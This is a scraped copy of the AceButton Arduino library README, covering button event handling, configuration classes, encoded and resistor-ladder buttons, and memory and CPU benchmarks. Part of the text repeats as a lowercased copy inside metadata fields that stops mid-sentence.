examples/ClickVersusDoubleClickUsingBoth/.\nDistinguishing Pressed and LongPressed\nSometimes it is useful to capture both a Pressed event and a LongPressed event from a single button. Since every button press always triggers a kEventPressed event, the only reasonable way to distinguish between Pressed and LongPressed is to use the kEventReleased as a substitute for the simple Pressed event. When we active kFeatureLongPress, we then must activate the kFeatureSuppressAfterLongPress feature to suppress the kEventReleased event after the kEventLongPressed to avoid yet another overlap of events.\nButtonConfig* config = button.getButtonConfig();\nconfig->setFeature(ButtonConfig::kFeatureLongPress);\nconfig->setFeature(ButtonConfig::kFeatureSuppressAfterLongPress);\nThis works most of the time, but I encountered an edge case. Occasionally we want to capture the Released event after the LongPressed event, even if kEventReleased must be suppressed as described above. To solve this edge case, in v1.8, I added a new event type kEventLongReleased which is triggered as a substitute for kEventReleased, only if kFeatureSuppressAfterLongPress is used to suppress kEventReleased.\nSee the example code at examples/PressVersusLongPress to see how all these come together.\nEvents After Reboot\nA number of edge cases occur when the microcontroller is rebooted:\nif the button is held down, should the Pressed event be triggered?\nif the button is in its natural Released state, should the Released event happen?\nif the button is Pressed down, and ButtonConfig is configured to support RepeatPress events, should the kEventRepeatPressed events be triggered initially?\nI think most users would expect that in all these cases, the answer is no, the microcontroller should not trigger an event until the button undergoes a human-initiated change in state. The AceButton library implements this logic. (It might be useful to make this configurable using a ButtonConfig feature flag but that is not implemented.)\nOn the other hand, it is sometimes useful to perform some special action if a button is pressed while the device is rebooted. To support this use-case, call the AceButton::isPressedRaw() in the global setup() method (after the button is configured). It will directly call the digitalRead() method associated with the button pin and return true if the button is in the Pressed state.\nOrphaned Clicks\nWhen a Clicked event is generated, the AceButton class looks for a second Clicked event within a certain time delay (default 400 ms) to determine if the second Clicked event is actually a DoubleClicked event.\nAll internal timestamps in AceButton are stored as uint16_t (i.e. an unsigned integer of 16 bits) in millisecond units. A 16-bit unsigned counter rolls over after 65536 iterations. Therefore, if the second Clicked event happens between (65.636 seconds, 66.036 seconds) after the first Clicked event, a naive-logic would erroneously consider the (long-delayed) second click as a double-click.\nThe AceButton contains code that prevents this from happening.\nNote that even if the AceButton class uses an unsigned long type (a 32-bit integer on the Arduino), the overflow problem would still occur after 2^32 milliseconds (i.e. 49.7 days). To be strictly correct, the AceButton class would still need logic to take care of orphaned Clicked events.\nBinary Encoded Buttons\nInstead of allocating one pin for each button, we can use Binary Encoding to support large number of buttons with only a few pins. The circuit can be implemented using a 74LS148 chip, or simple diodes like this:\nThree subclasses of ButtonConfig are provided to handle binary encoded buttons:\nEncoded4To2ButtonConfig: 3 buttons with 2 pins\nEncoded8To3ButtonConfig: 7 buttons with 3 pins\nEncodedButtonConfig: M=2^N-1 buttons with N pins\nSee docs/binary_encoding/README.md for information on how to use these classes.\nResistor Ladder Buttons\nIt is possible to attach 1-8 (maybe more) buttons on a single analog pin through a resistor ladder, and use the analogRead() to read the different voltages generated by each button. An example circuit looks like this:\nThe LadderButtonConfig class handles this configuration.\nSee docs/resistor_ladder/README.md for information on how to use this class.\nDynamic Allocation on the Heap\nAll classes in this library were originally designed to be created statically at startup time and never deleted during the lifetime of the application. Since they were never meant to be deleted through the pointer, I did not include the virtual destructor for polymorphic classes (i.e. ButtonConfig and its subclasses). The AceButton class is not polymorphic and does not need a virtual destructor.\nMost 8-bit processors have limited flash and static memory (for example, 32 kB flash and 2 KB static for the Nano or UNO). Adding a virtual destructor causes 600 additional bytes of flash memory to be consumed. I suspect this is due to the virtual destructor pulling the malloc() and free() functions which are needed to implement the new and delete operators. For a library that consumes only about 1200 bytes on an 8-bit processor, this increase in flash memory size did not seem acceptable.\nFor 32-bit processors (e.g. ESP8266, ESP32) which have far more flash memory (e.g. 1 MB) and static memory (e.g. 80 kB), it seems reasonable to allow AceButton and ButtonConfig to be created and deleted from the heap. (See Issue #46 for the motivation.) Testing shows that the virtual destructor adds only about 60-120 bytes of flash memory for these microcontrollers, probably because the malloc() and free() functions are already pulled in by something else. The 60-120 bytes of additional consumption seems trivial compared to the range of ~256 kB to ~4 MB flash memory available on these 32-bit processors.\nTherefore, I added a virtual destructor for the ButtonConfig class (v1.5) and enabled it for all architectures other than ARDUINO_ARCH_AVR (v1.6.1). This prevents 8-bit processors with limited memory from suffering the overhead of an extra 600 bytes of flash memory usage.\nEven for 32-bit processors, I still recommend avoiding the creation and deletion of objects from the heap, to avoid the risk of heap fragmentation. If a variable number of buttons is needed, it might be possible to design the application so that all buttons which will ever be needed are predefined in a global pool. Even if some of the AceButton and ButtonConfig instances are unused, the overhead is probably smaller than the overhead of wasted space due to heap fragmentation.\nDigital Write Fast\nThe digitalWriteFast libraries provide smaller and faster alternative versions the digitalWrite(), digitalRead(), and pinMode() functions. I have used 2 such libraries, but there probably others:\nhttps://github.com/NicksonYap/digitalWriteFast\na simplified fork of the watterott library\nbut it seems to be unmaintained, e.g. does not support ATtiny85\nhttps://github.com/watterott/Arduino-Libs/tree/master/digitalWriteFast\nseems to be better maintained, but is not an independent library\nyou must manually git clone the repo and copy or symlink the digitalWriteFast/ directory into your Arduino IDE libraries directory\nThese libraries provide the following functions: digitalWriteFast(), digitalReadFast(), and pinModeFast() which are usually valid only AVR processors. These alternative functions depend on the pin number and value to be compile-time constants, bypassing the pin number lookup tables used by the standard versions. These fast versions can be 20-50X faster. More importantly in many situations, they can save 100-500 bytes of flash memory by not pulling in the pin number lookup tables.\nI created 3 alternative versions of ButtonConfig which use the digitalWriteFast libraries:\nsrc/ace_button/fast/ButtonConfigFast1.h\nsrc/ace_button/fast/ButtonConfigFast2.h\nsrc/ace_button/fast/ButtonConfigFast3.h\n(If ButtonConfigFast4.h is needed, it is easy to copy ButtonConfigFast3.h and create a 4-pin version.)\nThese classes use C++ templates on the pin numbers, so that they can be passed to the digitalReadFast() functions as compile-time constants. Because they depend on an external digitalWriteFast library, they are not included in the <AceButton.h> header file. They must be included explicitly, as shown below:\n#include <Arduino.h>\n#include <AceButton.h>\n#include <digitalWriteFast.h>\n#include <ace_button/fast/ButtonConfigFast2.h>\nusing namespace ace_button;\n// Physical pin numbers attached to the buttons.\nconst uint8_t BUTTON1_PHYSICAL_PIN = 2;\nconst uint8_t BUTTON2_PHYSICAL_PIN = 3;\n// Virtual pin numbers attached to the buttons.\nconst uint8_t BUTTON1_PIN = 0;\nconst uint8_t BUTTON2_PIN = 1;\nButtonConfigFast2<BUTTON1_PHYSICAL_PIN, BUTTON2_PHYSICAL_PIN> buttonConfig;\nAceButton button1(&buttonConfig, BUTTON1_PIN);\nAceButton button2(&buttonConfig, BUTTON2_PIN);\nvoid handleEvent(AceButton* button, uint8_t eventType, uint8_t buttonState) {\n...\n}\nvoid setup() {\n...\n}\nvoid loop() {\n// Should be called every 4-5ms or faster, for the default debouncing time\n// of ~20ms.\nbutton1.check();\nbutton2.check();\n}\nEach physical pin number given as template arguments to the ButtonConfigFast2<> class corresponds to a virtual pin number (starting with 0) assigned to the AceButton object. Within the event handler, everything is referenced by the virtual pin number, just like the EncodedButtonConfig and LadderButtonConfig classes.\nHere are the example programs for each ButtonConfigFast{N} class:\nexamples/SingleButtonFast (ButtonConfigFast1)\nexamples/TwoButtonsUsingOneButtonConfigFast (ButtonConfigFast2)\nexamples/ThreeButtonsUsingOneButtonConfigFast (ButtonConfigFast3)\nThe LadderButtonConfig class uses analogRead() which does not seem to directly benefit from digitalWriteFast libraries. However, if you use pinModeFast() instead of pinMode() in your global setup() function, you can save about 50 bytes of flash (I think).\nThe Encoded4To2ButtonConfig and Encoded8To3ButtonConfig classes would probably benefit from digitalWriteFast libraries, but I have not created the \"fast\" versions of these (i.e. Encoded4To2ButtonConfigFast and Encoded8To3ButtonConfigFast) because I have not needed them personally.\nThe general EncodedButtonConfig class is more difficult to convert into a \"fast\" version, because its constructor takes a pointer argument to an array of physical pins. These are not compile-time constants so we would not be able to use the digitalWriteFast libraries directly. I think the best we could do is create special Encoded16To4ButtonConfigFast and Encoded32To5ButtonConfigFast classes.\nResource Consumption\nSizeOf Classes\nHere are the sizes of the various classes on the 8-bit AVR microcontrollers (Arduino Uno, Nano, etc):\nsizeof(AceButton): 14\nsizeof(ButtonConfig): 18\nsizeof(ButtonConfigFast1<>): 18\nsizeof(ButtonConfigFast2<>): 18\nsizeof(ButtonConfigFast3<>): 18\nsizeof(Encoded4To2ButtonConfig): 21\nsizeof(Encoded8To3ButtonConfig): 22\nsizeof(EncodedButtonConfig): 25\nsizeof(LadderButtonConfig): 26\nFor 32-bit microcontrollers:\nsizeof(AceButton): 16\nsizeof(ButtonConfig): 24\nsizeof(Encoded4To2ButtonConfig): 28\nsizeof(Encoded8To3ButtonConfig): 28\nsizeof(EncodedButtonConfig): 36\nsizeof(LadderButtonConfig): 36\n(An early version of AceButton, with only half of the functionality, consumed 40 bytes. It got down to 11 bytes before additional functionality increased it to 14.)\nFlash And Static Memory\nMemoryBenchmark was used to determine the size of the library for various microcontrollers (Arduino Nano to ESP32). Here are 2 samples:\nArduino Nano\n+--------------------------------------------------------------+\n| functionality | flash/ ram | delta |\n|---------------------------------+--------------+-------------|\n| Baseline | 610/ 11 | 0/ 0 |\n|---------------------------------+--------------+-------------|\n| ButtonConfig | 1946/ 51 | 1336/ 40 |\n| ButtonConfigFast1 | 1662/ 51 | 1052/ 40 |\n| ButtonConfigFast2 | 1630/ 65 | 1020/ 54 |\n| ButtonConfigFast3 | 1678/ 79 | 1068/ 68 |\n| Encoded4To2ButtonConfig | 2160/ 82 | 1550/ 71 |\n| Encoded8To3ButtonConfig | 2428/ 139 | 1818/ 128 |\n| EncodedButtonConfig | 2474/ 162 | 1864/ 151 |\n| LadderButtonConfig | 2476/ 175 | 1866/ 164 |\n+--------------------------------------------------------------+\nESP8266:\n+--------------------------------------------------------------+\n| functionality | flash/ ram | delta |\n|---------------------------------+--------------+-------------|\n| Baseline | 256924/26800 | 0/ 0 |\n|---------------------------------+--------------+-------------|\n| ButtonConfig | 258424/26840 | 1500/ 40 |\n| ButtonConfigFast1 | -1/ -1 | -1/ -1 |\n| ButtonConfigFast2 | -1/ -1 | -1/ -1 |\n| ButtonConfigFast3 | -1/ -1 | -1/ -1 |\n| Encoded4To2ButtonConfig | 258732/26916 | 1808/ 116 |\n| Encoded8To3ButtonConfig | 258876/26980 | 1952/ 180 |\n| EncodedButtonConfig | 259004/27020 | 2080/ 220 |\n| LadderButtonConfig | 259048/27024 | 2124/ 224 |\n+--------------------------------------------------------------+\nCPU Cycles\nThe profiling numbers for AceButton::check(), EncodedButtonConfig::checkButtons(), and LadderButtonConfig::checkButtons() can be found in examples/AutoBenchmark. Here are 2 samples, in units of microseconds.\nArduino Nano:\n+---------------------------+-------------+---------+\n| Button Event | min/avg/max | samples |\n|---------------------------+-------------+---------|\n| idle | 8/ 15/ 24 | 1931 |\n| press/release | 8/ 16/ 24 | 1924 |\n| click | 12/ 15/ 24 | 1924 |\n| double_click | 12/ 15/ 32 | 1921 |\n| long_press/repeat_press | 12/ 16/ 28 | 1924 |\n|---------------------------+-------------+---------|\n| ButtonConfigFast1 | 8/ 14/ 24 | 1933 |\n| ButtonConfigFast2 | 20/ 27/ 36 | 1910 |\n| ButtonConfigFast3 | 28/ 40/ 48 | 1886 |\n|---------------------------+-------------+---------|\n| Encoded4To2ButtonConfig | 60/ 67/ 92 | 1839 |\n| Encoded8To3ButtonConfig | 164/186/208 | 1659 |\n| EncodedButtonConfig | 80/100/124 | 1785 |\n| LadderButtonConfig | 176/199/272 | 1640 |\n+---------------------------+-------------+---------+\nESP8266:\n+---------------------------+-------------+---------+\n| Button Event | min/avg/max | samples |\n|---------------------------+-------------+---------|\n| idle | 6/ 8/ 52 | 1917 |\n| press/release | 6/ 8/ 62 | 1907 |\n| click | 6/ 8/ 38 | 1902 |\n| double_click | 6/ 8/ 32 | 1907 |\n| long_press/repeat_press | 6/ 8/ 41 | 1903 |\n|---------------------------+-------------+---------|\n| Encoded4To2ButtonConfig | 22/ 27/ 55 | 1878 |\n| Encoded8To3ButtonConfig | 54/ 66/ 90 | 1806 |\n| EncodedButtonConfig | 42/ 54/ 81 | 1831 |\n| LadderButtonConfig | 136/149/491 | 1682 |\n+---------------------------+-------------+---------+\nSystem Requirements\nHardware\nThis library has Tier 1 support on the following boards:\nArduino Nano (16 MHz ATmega328P)\nSparkFun Pro Micro (16 MHz ATmega32U4)\nSAMD21 M0 Mini (48 MHz ARM Cortex-M0+)\nSTM32 Blue Pill (STM32F103C8, 72 MHz ARM Cortex-M3)\nNodeMCU 1.0 (ESP-12E module, 80MHz ESP8266)\nWeMos D1 Mini (ESP-12E module, 80 MHz ESP8266)\nESP32 Dev Module (ESP-WROOM-32 module, 240MHz dual core Tensilica LX6)\nTeensy 3.2 (96 MHz ARM Cortex-M4)\nTier 2 support can be expected on the following boards, mostly because I don't test these as often:\nATtiny85 (8 MHz ATtiny85)\nArduino Pro Mini (16 MHz ATmega328P)\nTeensy LC (48 MHz ARM Cortex-M0+)\nMini Mega 2560 (Arduino Mega 2560 compatible, 16 MHz ATmega2560)\nThe following boards are not officially supported, but AceButton may accidentally work on these:\nAny platform using the ArduinoCore-API (https://github.com/arduino/ArduinoCore-api).\nFor example, Nano Every, MKRZero, and Raspberry Pi Pico RP2040.\nTool Chain\nThis library was developed and tested using:\nArduino IDE 1.8.13\nArduino CLI 0.14.0\nSpenceKonde ATTinyCore 1.5.2\nArduino AVR Boards 1.8.3\nArduino SAMD Boards 1.8.9\nSparkFun AVR Boards 1.1.13\nSparkFun SAMD Boards 1.8.3\nSTM32duino 2.0.0\nESP8266 Arduino Core 2.7.4\nESP32 Arduino Core 1.0.6\nTeensyduino 1.53\nIt should work with PlatformIO but I have not tested it.\nThe library works on Linux or MacOS (using both g++ and clang++ compilers) using the EpoxyDuino emulation layer.\nOperating System\nI use Ubuntu Linux 18.04 and 20.04 for most of my development.\nBackground Motivation\nThere are numerous \"button\" libraries out there for the Arduino. Why write another one? I wanted to add a button to an addressable strip LED controller, which was being refreshed at 120 Hz. I had a number of requirements:\nthe button needed to support a LongPress event, in addition to the simple Press and Release events\nthe button code must not interfere with the LED refresh code which was updating the LEDs at 120 Hz\nwell-tested, I didn't want to be hunting down random and obscure bugs\nSince the LED refresh code needed to run while the button code was waiting for a \"LongPress\" delay, it seemed that the cleanest API for a button library would use an event handler callback mechanism. This reduced the number of candidate libraries to a handful. Of these, only a few of them supported a LongPress event. I did not find the remaining ones flexible enough for my button needs in the future. Finally, I knew that it was tricky to write correct code for debouncing and detecting various events (e.g. DoubleClick, LongPress, RepeatPress). I looked for a library that contained unit tests, and I found none.\nI decided to write my own and use the opportunity to learn how to create and publish an Arduino library.\nNon-goals\nAn Arduino UNO or Nano has 16 times more flash memory (32KB) than static memory (2KB), so the library is optimized to minimize the static memory usage. The AceButton library is not optimized to create a small program size (i.e. flash memory), or for small CPU cycles (i.e. high execution speed). I assumed that if you are seriously optimizing for program size or CPU cycles, you will probably want to write everything yourself from scratch.\nThat said, examples/MemoryBenchmark shows that the library consumes between 970-2180 bytes of flash memory, and AutoBenchmark shows that AceButton::check() takes between ~15 microseconds on a 16MHz ATmega328P chip and 2-3 microseconds on an ESP32. Hopefully that is small enough and fast enough for the vast majority of people.\nWith v1.9, I started using AceButton on an ATtiny85 which has only 8kB of flash and 0.5 kB of static RAM. Flash memory consumption became more important and I created the ButtonConfigFast1, ButtonConfigFast2, and ButtonConfigFast3 classes to decrease the flash memory consumption by using one of the <digitalWriteFast.h> 3rd party libraries. See Digital Write Fast for more info.\nLicense\nVersions 1.0 to 1.0.6: Apache License 2.0\nVersions 1.1 and above: MIT License\nI changed to the MIT License starting with version 1.1 because the MIT License is so simple to understand. I could not be sure that I understood what the Apache License 2.0 meant.\nFeedback and Support\nIf you have any questions, comments, or feature requests for this library, please use the GitHub Discussions for this project. If you have a bug report, please file a ticket in GitHub Issues. Feature requests should go into Discussions first because they often have alternative solutions which are useful to remain visible, instead of disappearing from the default view of the Issue tracker after the ticket is closed.\nPlease refrain from emailing me directly unless the content is sensitive. The problem with email is that I cannot reference the email conversation when other people ask similar questions later.\nAuthor\nCreated by Brian T. Park (brian@xparks.net).", "link": "https://github.com/bxparks/AceButton", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "acebutton\nan adjustable, compact, event-driven button library for arduino platforms.\nthis library provides classes which accept inputs from a mechanical button connected to a digital input pin on the arduino. the library should be able to handle momentary buttons, maintained buttons, and switches, but it was designed primarily for momentary buttons.\nthe library is named \"acebutton\" because:\nmany configurations of the button are adjustable, either at compile-time or run-time\nthe library is optimized to create compact objects which take up a minimal amount of static memory\nthe library detects changes in the button state and sends events to a user-defined eventhandler callback function\nmost of the features of the library can be accessed through 2 classes, 1 callback function, and 1 interface:\nacebutton (class)\nbuttonconfig (class)\neventhandler (typedef)\nieventhandler (interface)\nthe acebutton class contains the logic for debouncing and determining if a particular event has occurred.\nthe buttonconfig class holds various timing parameters, the event handler, code for reading the button, and code for getting the internal clock.\nthe eventhandler is a user-defined callback function with a specific signature which is registered with the buttonconfig object. when the library detects interesting events, the callback function is called by the library, allowing the client code to handle the event.\nthe ieventhandler is an interface (pure abstract class) that provides an alternative to the eventhandler. instead of using a callback function, an object of type ieventhandler can be used to handle the button events.\nthe supported events are:\nacebutton::keventpressed\nacebutton::keventreleased\nacebutton::keventclicked\nacebutton::keventdoubleclicked\nacebutton::keventlongpressed\nacebutton::keventrepeatpressed\nacebutton::keventlongreleased (v1.8)\nthe basic buttonconfig class assumes that each button is connected to a single digital input pin. in some situations, the number of buttons that we want is greater than the number of input pins available. this library provides 2 subclasses of buttonconfig which may be useful:\nencodedbuttonconfig\nsupports binary encoded buttons, to read 2^n - 1 buttons using n pins (e.g. 7 buttons using 3 digital pins).\nladderbuttonconfig\nsupports 1-8 buttons (maybe more) on a single analog pin through a resistor ladder. the analogread() method is used to read the different voltage levels corresponding to each button.\nboth encodedbuttonconfig and ladderbuttonconfig support all 7 events listed above (e.g. keventclicked and keventdoubleclicked).\nversion: 1.9.1 (2021-08-10)\nchangelog: changelog.md\ntable of contents\nfeatures\nhellobutton\ninstallation\nexternal dependencies\nsource code\ndocumentation\nexamples\nusage\ninclude header and use namespace\npin wiring and initialization\nacebutton class\nsampling rate\ncompiler error on pin 0\nbuttonconfig class\nsystem buttonconfig\nconfiguring the eventhandler\ntiming parameters\nhardware dependencies\nmultiple buttonconfig instances\neventhandler typedef\neventhandler signature\neventhandler parameters\none eventhandler per buttonconfig\neventhandler tips\nevent types\nbuttonconfig feature flags\nevent activation\nevent suppression\nsingle button simplifications\nmultiple buttons\nadvanced topics\nobject-based event handler\ndistinguishing clicked and doubleclicked\ndistinguishing pressed and longpressed\nevents after reboot\norphaned clicks\nbinary encoded buttons\nresistor ladder buttons\ndynamic allocation on the heap\ndigital write fast\nresource consumption\nsizeof classes\nflash and static memory\ncpu cycles\nsystem requirements\nhardware\n-----> tool !!!  chain\noperating system\nbackground motivation\nnon-goals\nlicense\nfeedback and support\nauthor\nfeatures\nhere are the high-level features of the acebutton library:\ndebounces the mechanical contact\nsupports both pull-up and pull-down wiring\nevent-driven through a user-defined eventhandler callback function\nevent-driven through an object-based ieventhandler (>= v1.6)\nsupports 7 event types:\nkeventpressed\nkeventreleased\nkeventclicked\nkeventdoubleclicked\nkeventlongpressed\nkeventrepeatpressed\nkeventlongreleased\nadjustable configurations at runtime or compile-time\ntiming parameters\ndigitalread() button read function can be overridden\nmillis() clock function can be overridden\nsmall memory footprint\neach acebutton consumes 14 bytes (8-bit) or 16 bytes (32-bit)\neach buttonconfig consumes 18 bytes (8-bit) or 24 bytes (32-bit)\none system buttonconfig instance created automatically by the library\n970-2180 bytes of flash memory for the simple case of 1 acebutton and 1 buttonconfig, depending on 8-bit or 32-bit processors\nsupports multiple buttons on shared pins using various circuits\nbinary encoded buttons (e.g. 7 buttons using 3 pins)\nresistor ladder buttons (e.g. 5 buttons on a single analog pin)\nonly 13-15 microseconds (on 16mhz atmega328p) per polling call to acebutton::check()\nextensive testing\nthoroughly unit tested using aunit\ntested on arduino avr (uno, nano, micro etc), teensy arm (lc and 3.2), samd21 (arduino zero compatible), esp8266 and esp32\ncompared to other arduino button libraries, i think the unique or exceptional features of the acebutton library are:\nmany supported event types (e.g. longpressed and repeatpressed)\nable to distinguish between clicked and doubleclicked\nsmall memory usage\nthorough unit testing\nsupport for multiple buttons using binary encoding or a resistor ladder\nhellobutton\nhere is a simple program (see examples/hellobutton) which controls the builtin led on the arduino board using a momentary button connected to pin 2.\n#include <acebutton.h>\nusing namespace ace_button;\nconst int button_pin = 2;\nconst int led_on = high;\nconst int led_off = low;\nacebutton button(button_pin);\nvoid handleevent(acebutton*, uint8_t, uint8_t);\nvoid setup() {\npinmode(led_builtin, output);\npinmode(button_pin, input_pullup);\nbutton.seteventhandler(handleevent);\n}\nvoid loop() {\nbutton.check();\n}\nvoid handleevent(acebutton* /*button*/, uint8_t eventtype,\nuint8_t /*buttonstate*/) {\nswitch (eventtype) {\ncase acebutton::keventpressed:\ndigitalwrite(led_builtin, led_on);\nbreak;\ncase acebutton::keventreleased:\ndigitalwrite(led_builtin, led_off);\nbreak;\n}\n}\n(the button and buttonstate parameters are commented out to avoid an unused parameter warning from the compiler. we can't remove the parameters completely because the method signature is defined by the eventhandler typedef.)\ninstallation\nthe latest stable release is available in the arduino ide library manager. search for \"acebutton\". click install.\nthe development version can be installed by cloning the github repository (https://github.com/bxparks/acebutton), checking out the develop branch, then manually copying over the contents to the ./libraries directory used by the arduino ide. (the result is a directory named ./libraries/acebutton.)\nthe master branch contains the tagged stable releases.\nexternal dependencies\nthe core of the library is self-contained and has no external dependencies.\nthe some programs in examples/ may depend on:\nacecommon (https://github.com/bxparks/acecommon)\nthe unit tests under tests depend on:\naunit (https://github.com/bxparks/aunit)\nsource code\nthe source files are organized as follows:\nsrc/acebutton.h - main header file\nsrc/ace_button/ - all implementation files\nsrc/ace_button/testing/ - internal testing files\ntests/ - unit tests which require aunit\nexamples/ - example sketches\ndocumentation\nthis readme.md\ndocs/binary_encoding/readme.md\nexplanation of reading buttons through binary encoding using the encoded4to2buttonconfig, encoded8to3buttonconfig, encodedbuttonconfig classes\ndocs/resistor_ladder/readme.md\nexplanation of reading buttons through a resistor ladder using the ladderbuttonconfig class\ndoxygen docs published on github pages which can help navigate an unfamiliar code base.\nexamples\nthe following example sketches are provided:\nbasic single button\nhellobutton\nminimal program that reads a switch and control the built-in led\nsinglebutton\nsingle button wired with an internal pull-up resistor\nsinglebuttonpulldown\nsame as singlebutton but with an external pull-down resistor\nsinglebuttonusingieventhandler\nsame as singlebutton using an object-based ieventhandler\nstopwatch\nmeasures the speed of acebutton:check() with a start/stop/reset\nbutton uses kfeaturelongpress\nmultiple buttons\ntwobuttonsusingonebuttonconfig\ntwo buttons using one buttonconfig\ntwobuttonsusingtwobuttonconfigs\ntwo buttons using two buttonconfigs\nthreebuttonsusingonebuttonconfig\nthree buttons using one buttonconfig\nused as a reference for threebuttonsusingonebuttonconfigfast (below)\ntunerbuttons\nimplements 5 radio buttons (tune-up, tune-down, and 3 presets)\nshows multiple buttonconfig and eventhandler instances\nshows an example of how to use getid()\nuses kfeaturelongpress, kfeaturerepeatpress, kfeaturesuppressafterlongpress, and kfeaturesuppressafterrepeatpress\narraybuttons\nshows how to define an array of acebutton and initialize them using the init() method in a loop\nsimultaneousbuttons\ndetecting simultaneous button presses of 2 buttons using a custom ieventhandler\ndistinguishing click versus double-click\nclickversusdoubleclickusingreleased\na way to distinguish between a keventclicked from a keventdoubleclicked using a keventreleased instead\nclickversusdoubleclickusingsuppression\nanother way to dstinguish between a keventclicked from a keventdoubleclicked using the kfeaturesuppressclickbeforedoubleclick flag at the cost of increasing the response time of the keventclicked event\nclickversusdoubleclickusingboth\nan example that combines both the \"usingpressed\" and \"usingsuppression\" techniques\ndistinguishing pressed and longpressed\nexamples/pressedandlongpressed\nsee also the distinguishing pressed and longpressed subsection below\ncapacitivebutton\nreads a capacitive button using the capacitivesensor library\nbinary encoded buttons\nencoded4to2buttons\ndemo of encoded4to2buttonconfig class to decode m=3 buttons with n=2 pins\nencoded8to3buttons\ndemo of encoded8to3buttonconfig class to decode m=7 buttons with n=3 pins\nencoded16to4buttons\ndemo of general m-to-n encodedbuttonconfig class to handle m=15 buttons with n=4 pins\nresistor ladder buttons\nladderbuttoncalibrator\nprint out the value returned by analogread() for various buttons\nuseful to compare the expected values of the resistor ladder versus the actual values returned by the function\nladderbuttons\ndemo of 4 buttons on a single analog pin using analogread()\nladderbuttonstiny\n2 buttons on the reset/a0 pin of an attiny85 microcontroller\navoids wasting the reset pin, saving the other pins for other purposes\ndigitalwritefast\nsinglebuttonfast\nsame as singlebutton but using buttonconfigfast1<pin> which uses the digitalwritefast library\ntwobuttonsusingonebuttonconfigfast\nsame as twobuttonsusingonebuttonconfig but using buttonconfigfast2<pin0,pin1> which uses the digitalwritefast library\nthreebuttonsusingonebuttonconfigfast\nsame as threebuttonsusingonebuttonconfig but using buttonconfigfast3<pin0,pin1,pin2> which uses the digitalwritefast library\nbenchmarks\nthese are internal benchmark programs. they were not written as examples of how to use the library.\nautobenchmark\ngenerates the timing stats (min/average/max) for the acebutton::check() method for various types of events (idle, press/release, click, double-click, and long-press)\nmemorybenchmark\ndetermines the amount of flash memory consumed by various objects and features of the library\nusage\nthere are 2 classes and one typedef that a user will normally interact with:\nacebutton (class)\nbuttonconfig (class)\neventhandler (typedef)\nadvanced usage is supported by:\nencodedbuttonconfig - binary encoded buttons supporting 2^n-1 buttons on n digital pins\nladderbuttonconfig - resistor ladder buttons using analog pins\nieventhandler - use a callback object instead of a callback function\nwe explain how to use these below.\ninclude header and use namespace\nonly a single header file acebutton.h is required to use this library. to prevent name clashes with other libraries that the calling code may use, all classes are defined in the ace_button namespace. to use the code without prepending the ace_button:: prefix, use the using directive:\n#include <acebutton.h>\nusing namespace ace_button;\nif you are dependent on just acebutton, the following might be sufficient:\n#include <acebutton.h>\nusing ace_button::acebutton;\npin wiring and initialization\nthe buttonconfig class supports the simplest wiring. each button is connected to a single digital input pin, as shown below. in the example below, 3 buttons labeled s0, s1 and s2 are connected to digital input pins d2, d3, and d4:\nan arduino microcontroller pin can be in an output mode, an input mode, or an input_pullup mode. this mode is controlled by the pinmode() method.\nby default upon boot, the pin is set to the input mode. however, this input mode puts the pin into a high impedance state, which means that if there is no wire connected to the pin, the voltage on the pin is indeterminate. when the input pin is read (using digitalread()), the boolean value will be a random value. if you are using the pin in input mode, you must connect an external pull-up resistor (connected to vcc) or pull-down resistor (connected to ground) so that the voltage level of the pin is defined when there is nothing connected to the pin (i.e. when the button is not pressed).\nthe input_pullup mode is a special input mode which tells the microcontroller to connect an internal pull-up resistor to the pin. it is activated by calling pinmode(pin, input_pullup) on the given pin. this mode is very convenient because it eliminates the external resistor, making the wiring simpler.\nthe 3 resistors rc1, rc2 and rc3 are optional current limiting resistors. they help protect the microcontroller in the case of misconfiguration. if the pins are accidentally set to output mode, then pressing one of the buttons would connect the output pin directly to ground, causing a large amount of current to flow that could permanently damage the microcontroller. the resistance value of 220 ohms (or maybe 330 ohms) is high enough to keep the current within safety limits, but low enough compared to the internal pullup resistor that it is able to pull the digital pin to a logical 0 level. these current limiting resistors are good safety measures, but i admit that i often get lazy and don't use them when doing quick experiments.\nthe acebutton library itself does not call the pinmode() function. the calling application is responsible for calling pinmode(). normally, this happens in the global setup() method but the call can happen somewhere else if the application requires it. the reason for decoupling the hardware configuration from the acebutton library is mostly because the library does not actually care about the specific hardware wiring of the button. it does not care whether an external resistor is used, or the internal resistor is used. it only cares about whether the resistor is a pull-up or a pull-down.\nsee https://www.arduino.cc/en/tutorial/digitalpins for additional information about the i/o pins on an arduino.\nacebutton class\nthe acebutton class looks like this (not all public methods are shown):\nnamespace ace_button {\nclass acebutton {\npublic:\nstatic const uint8_t keventpressed = 0;\nstatic const uint8_t keventreleased = 1;\nstatic const uint8_t keventclicked = 2;\nstatic const uint8_t keventdoubleclicked = 3;\nstatic const uint8_t keventlongpressed = 4;\nstatic const uint8_t keventrepeatpressed = 5;\nstatic const uint8_t keventlongreleased = 6;\nstatic const uint8_t kbuttonstateunknown = 127;\nexplicit acebutton(uint8_t pin = 0, uint8_t defaultreleasedstate = high,\nuint8_t id = 0);\nexplicit acebutton(buttonconfig* buttonconfig, uint8_t pin = 0,\nuint8_t defaultreleasedstate = high, uint8_t id = 0);\nvoid init(uint8_t pin = 0, uint8_t defaultreleasedstate = high,\nuint8_t id = 0);\nvoid init(buttonconfig* buttonconfig, uint8_t pin = 0,\nuint8_t defaultreleasedstate = high, uint8_t id = 0);\nbuttonconfig* getbuttonconfig();\nvoid setbuttonconfig(buttonconfig* buttonconfig);\nvoid seteventhandler(buttonconfig::eventhandler eventhandler);\nuint8_t getpin();\nuint8_t getdefaultreleasedstate();\nuint8_t getid();\nvoid check();\n};\n}\neach physical button will be handled by an instance of acebutton. at a minimum, the instance needs to be told the pin number of the button. this can be done through the constructor:\nconst uint8_t button_pin = 2;\nacebutton button(button_pin);\nvoid setup() {\npinmode(button_pin, input_pullup);\n...\n}\nor we can use the init() method in the setup():\nacebutton button;\nvoid setup() {\npinmode(button_pin, input_pullup);\nbutton.init(button_pin);\n...\n}\nboth the constructor and the init() function take 3 optional parameters as shown above:\npin: the i/o pin number assigned to the button\ndefaultreleasedstate: the logical value of the button when it is in its default \"released\" state (high using a pull-up resistor, low for a pull-down resistor)\nid: an optional, user-defined identifier for the button, for example, an index into an array with additional information\nthe pin must be defined either through the constructor or the init() method. but the other two parameters may be optional in many cases.\nsampling rate\nto read the state of the button, the acebutton::check() method should be called from the loop() method periodically. roughly speaking, this should be about 4 times faster than the value of 